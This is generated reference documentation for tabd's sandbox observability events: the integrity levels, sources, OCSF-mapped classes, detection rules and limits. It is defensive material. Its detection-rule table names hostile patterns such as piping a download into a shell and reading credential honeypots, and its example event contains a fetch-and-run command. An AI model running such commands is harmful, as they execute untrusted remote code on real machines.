# Tab observability events, v1

<!-- Generated from tabd/src/obs/schema.ts and tabd/src/obs/detect.ts by tabd/tools/gen-obs-docs.ts; do not edit. -->

Design: [ADR tab observability](../adr/20261104-tab-observability.md). JSON Schema:
[`tabd/schema/event.v1.json`](../../tabd/schema/event.v1.json). Protocol methods:
[PROTOCOL.md](PROTOCOL.md) §3 (`tab.events.*`, `tab.observe`).

Each tab has one ordered stream. The supervisor stamps `v`, `seq`, `time` and `tabId` and
validates, redacts, escapes and caps every field (`tabd/src/obs/schema.ts` `normalizeDraft`). Field
names follow Falco's JSON output where they overlap; `seclab tab logs --format falco` renders
Falco-compatible lines for SIEM forwarders, tagged with the OCSF `class_uid` below.

**Never base a security decision on an event whose `integrity` isn't `trusted`.**

## Integrity
| `integrity` | Meaning |
|---|---|
| `trusted` | Produced outside the tab by host components (tabd, broker, RPC filter, host watchers). The tab can neither forge nor suppress it. |
| `host-observed` | Observed by a sensor outside the tab's namespaces on the host kernel (OCI: Falco). Only a kernel escape can suppress it; the content (argv, paths) is still chosen by the tab. |
| `tab-vm-root` | Observed by the collector running as root inside the tab's own microVM (sbx). Root inside the tab can forge or suppress it; the tab user cannot. |

A `detection` takes the weakest integrity of its causes.

## Sources
| `source` | Integrity | What |
|---|---|---|
| `tabd` | `trusted` | Supervisor lifecycle, fence verification, observation state. |
| `scan` | `trusted` | Pre-mount secret scan (counts and redacted locations only). |
| `broker` | `trusted` | Broker `audit.event` notifications from the control channel tabd owns. |
| `rpc-filter` | `trusted` | RPC capability filter decisions, reported by the trusted client over `tab.events.report`. |
| `sbx-policy` | `trusted` | `sbx policy log --json` for the tab, polled and diffed. |
| `workspace-watch` | `trusted` | Host-side watcher on the workspace directory (no process attribution). |
| `gate` | `trusted` | Workspace write-back gate decisions (reserved). |
| `sbx-collector` | `tab-vm-root` | `seclab-obs-collect` inside an sbx tab VM: strace, honeypot inotify, heartbeats. |
| `falco` | `host-observed` | Falco modern_ebpf on the Docker host, filtered to tab containers. |
| `detector` | weakest cause | tabd detection rules over the stream; integrity is the weakest of the causes. |

## Classes
| `class` | OCSF `class_uid` | Meaning |
|---|---|---|
| `tab.lifecycle` | 6002 | Tab claimed, starting, running, stopped, removed, quarantined. |
| `fence.verify` | 2003 | Fence verification result. |
| `scan.result` | 2006 | Secret scan result (no values). |
| `egress.request` | 4002 | Broker allowed, denied or blocked a request. |
| `egress.approval` | 4002 | Broker prompt opened or resolved. |
| `credential.use` | 3002 | Broker credential event (never a value). |
| `broker.status` | 6002 | Broker lifecycle, policy and control events. |
| `rpc.decision` | 6003 | RPC capability filter verdict. |
| `policy.log` | 4001 | sbx proxy allowed or blocked a destination (aggregated count delta). |
| `workspace.change` | 1001 | A workspace file was created, changed or removed (host watcher). |
| `process.exec` | 1007 | A process executed a program. |
| `process.exit` | 1007 | A process exited. |
| `file.open` | 1001 | A file was opened (deep mode or sensitive path). |
| `file.write` | 1001 | A file was opened for writing or created. |
| `file.delete` | 1001 | A file was unlinked. |
| `file.rename` | 1001 | A file was renamed or linked. |
| `file.chmod` | 1001 | File mode changed. |
| `net.connect` | 4001 | A socket connect attempt. |
| `priv.change` | 1007 | setuid/setgid family call. |
| `proc.ptrace` | 1007 | ptrace call. |
| `proc.signal` | 1007 | A signal sent to another process. |
| `proc.sensitive` | 1007 | mount, unshare, setns, bpf, memfd_create and similar. |
| `honeypot.access` | 1001 | A seeded honeypot file was opened, read, changed or removed. |
| `sensor.status` | 6002 | Sensor started, ready, untraced process found, events dropped, gap. |
| `detection` | 2004 | A detection rule matched; `cause` lists the triggering events. |

## Priorities
Falco's names, highest first: `emergency`, `alert`, `critical`, `error`, `warning`, `notice`, `informational`, `debug`.

## Observation states
Reported in `tab.observation` notifications, `tab.events.tail` results and `sensor.status` events.

| State | Meaning |
|---|---|
| `observed` | A sensor is connected and heartbeating. |
| `degraded` | Connected, but events were dropped or a process escaped tracing. |
| `unobserved` | No sensor heartbeat: the sensor died, was killed or never started. In-tab activity is not being recorded. |
| `unavailable` | This driver or template has no sensor. |

## Detection rules
| `rule` | Default priority | Fires when |
|---|---|---|
| `loader.pipe-to-interpreter` | `critical` | A download is piped straight into an interpreter (`curl … \| node`, `wget … \| sh`). |
| `loader.eval` | `warning` | An interpreter runs inline code that decodes or evaluates a payload (`node -e`, `python -c` with eval/exec/base64/child_process). |
| `task.network-tool` | `warning` | A network tool runs inside the tab; critical when spawned from the extension host within 60 s of open (folder-open task pattern). |
| `process.detach` | `warning` | A process detaches from its parent (`nohup`, `setsid`, `daemonize`, `screen -dm`, `tmux new -d`). |
| `credential.honeypot-read` | `critical` | A seeded honeypot (ssh key, cloud or browser credentials, wallet, keyring) was read. |
| `credential.path-open` | `warning` | A credential-like path was opened. |
| `sensor.honeypot-tamper` | `warning` | A honeypot was modified, moved or deleted. |
| `workspace.host-executable-write` | `warning` | A file the host may execute or load was written in the workspace (git hooks, `.envrc`, `.vscode/*.json`, `package.json`, Makefile, CI workflows, …); critical within 60 s of open. |
| `workspace.package-scripts` | `warning` | `package.json` scripts changed. |
| `egress.bypass` | `warning` | A connect to anything other than loopback or the tab's broker (an attempt to bypass the proxy). |
| `escape.container-socket` | `critical` | A connect to a container runtime socket (docker, containerd, podman). |
| `priv.escalation` | `critical` | A setuid-family call to root succeeded. |
| `priv.sensitive-syscall` | `warning` | mount, unshare, setns, bpf, memfd_create, module load, chroot, perf_event_open or keyring calls. |
| `proc.ptrace-attach` | `warning` | A process attached to another with ptrace. |
| `sensor.tamper` | `critical` | A signal or ptrace aimed at the sensor or init. |
| `beacon.periodic` | `warning` | Repeated connection attempts to one destination at a regular interval (C2 beacon pattern). |

## Limits
| Field | Limit |
|---|---|
| `summary` | 512 |
| `exe` | 512 |
| `argvItems` | 32 |
| `argvItem` | 256 |
| `path` | 1024 |
| `addr` | 128 |
| `lineage` | 8 |
| `detailKeys` | 16 |
| `detailValue` | 256 |
| `cause` | 16 |
| `rule` | 64 |
| `ref` | 1024 |

Lines from an in-tab sensor longer than 64 KiB are dropped and counted. Each tab is rate-limited
(sensor events 500/s, burst 5 000; host events 200/s, burst 2 000); drops are summarised once a
second as `sensor.status` and mark the tab `degraded`. The log keeps 4 × 8 MiB segments per tab
under `<state>/events/<tabId>/`.

## Example
```json
{"v":1,"seq":42,"time":"2026-11-04T22:42:01.517Z","tabId":"t-abcdefghijklmnopqrstuvwxyz","source":"detector","integrity":"tab-vm-root","class":"detection","priority":"critical","rule":"loader.pipe-to-interpreter","summary":"download piped to an interpreter: sh -c curl -s http://192.0.2.10/p | node","proc":{"pid":388,"ppid":387,"exe":"/usr/bin/dash","argv":["sh","-c","curl -s http://192.0.2.10/p | node"],"lineage":[{"pid":387,"exe":"/bin/sh"}]},"cause":[41]}
```
